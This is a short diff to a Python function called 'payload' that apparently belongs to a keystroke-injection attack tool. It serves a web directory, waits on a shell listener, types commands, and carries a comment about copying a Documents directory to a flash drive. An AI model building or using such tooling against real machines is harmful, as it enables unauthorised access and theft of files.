@@ -70,7 +70,7 @@ def payload(web_dir):
 	os.chdir(web_dir)
 	httpHandler = http.server.SimpleHTTPRequestHandler
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
-	httplistener=Process(target=httpd.serve_forever)
+	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
 	os.chdir("..")
 	for i in range(4):
@@ -91,7 +91,6 @@ def payload(web_dir):
 	shelllistener.join()
 	print("Shell exited")
 	# Copy Documents Directory to Flash Drive
-	httpd.shutdown()
 	httpd.server_close()
 	httplistener.join(2)
 	eco.type("exit")
